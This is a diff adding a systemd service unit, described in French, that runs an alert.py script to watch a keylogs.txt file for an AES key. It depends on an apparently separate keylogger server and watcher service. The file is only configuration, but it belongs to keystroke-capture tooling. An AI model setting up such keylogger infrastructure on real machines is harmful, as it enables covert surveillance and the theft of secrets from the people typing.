@@ -1,0 +1,15 @@
+[Unit]
+Description=Surveillance du fichier keylogs.txt pour détection de la clé AES
+After=keylogger-server.service
+Requires=keylogger-server.service
+PartOf=keylogger-server.service
+
+[Service]
+Type=simple
+User=joe
+ExecStart=/usr/bin/python3 /home/joe/keylogger/alert.py
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+Also=keylogger-watcher.service
